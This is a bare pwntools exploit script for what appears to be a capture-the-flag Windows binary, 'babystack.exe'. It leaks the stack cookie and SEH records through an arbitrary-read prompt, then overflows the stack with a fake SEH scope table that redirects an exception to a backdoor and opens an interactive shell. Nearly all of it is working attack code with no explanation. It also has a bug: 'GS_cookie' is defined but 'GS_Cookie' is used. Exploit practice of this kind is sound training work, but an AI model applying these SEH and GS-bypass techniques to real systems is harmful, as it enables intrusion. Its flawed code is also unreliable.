from pwn import *
from os import *
# context.log_level = 'debug'
context.arch = 'i386'

p = process('./babystack.exe')
#sh = remote('node4.buuoj.cn', 29910)

def get_value(addr):
    p.recvuntil('Do you want to know more?')
    p.sendline('yes')
    p.recvuntil('Where do you want to know')
    p.sendline(str(addr))
    p.recvuntil('value is ')
    return int(p.recvline(), 16)

main = 0x10b0
target = 0x139B
__security_cookie_offset = 0x4004
backdoor = 0x138D
handler = 0x1460

p.recvuntil('stack address =')
result = p.recvline()
stack_addr = int(result, 16)
ebp_addr = stack_addr + 0x9c

p.recvuntil('main address =')
result = p.recvline()
main_address = int(result, 16)
backdoor_addr = main_address - 0x10b0 + 0x138d

security_cookie = get_value(main_address + 0x2f54)  # 0x4004 - 0x10b0 = 0x2f54

GS_cookie = security_cookie ^ (ebp_addr)
seh_next_addr = ebp_addr -0x10
seh_next = get_value(seh_next_addr)
except_handler_addr = ebp_addr - 0xc
except_handler = get_value(except_handler_addr)

# pause()
p.sendline('n')
next_addr = stack_addr + 212  # 
# log.success('next_addr: ' + hex(next_addr))

fake_scope_table = p32(0x0FFFFFFE4)     #GSCookieOffset
fake_scope_table += p32(0)              #GSCookieXOROffset
fake_scope_table += p32(0x0FFFFFF20)    #EHCookieOffset
fake_scope_table += p32(0)              #EHCookieXOROffset
fake_scope_table += p32(0x0FFFFFFFE)    #ScopeRecord.EnclosingLevel
fake_scope_table += p32(backdoor_addr)    #ScopeRecord.FilterFunc

fake_scope_table_addr = stack_addr + 0x10

payload  = b'a' * 0x10
payload += fake_scope_table
payload = payload.ljust(0x9c - 0x1c, b'b')
payload += p32(GS_Cookie)   # fack_scopetabl_address = stack_address +  
payload += b'a' * 0x8
payload += p32(seh_next) 
payload += p32(except_handler) 
payload += p32(fake_scope_table_addr ^ security_cookie) 
payload += p32(0)

p.sendline(payload)

p.recvline()
p.sendline('yes')
p.recvuntil('Where do you want to know')
p.sendline('0')

p.interactive()